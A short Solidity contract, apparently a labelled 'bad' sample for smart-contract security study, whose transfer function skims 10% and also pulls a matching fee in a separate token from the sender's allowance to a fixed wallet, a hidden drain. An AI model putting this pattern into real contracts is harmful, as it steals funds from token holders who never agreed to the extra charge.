pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract HiddenFeeDrainBad {
    IERC20 public feeToken;
    address public feeWallet;
    mapping(address => uint256) internal _balances;

    constructor(IERC20 _feeToken, address _feeWallet) {
        feeToken = _feeToken;
        feeWallet = _feeWallet;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        uint256 fee = amount / 10;
        _balances[from] -= amount;
        _balances[to] += amount - fee;
        feeToken.transferFrom(from, feeWallet, fee);
    }
}
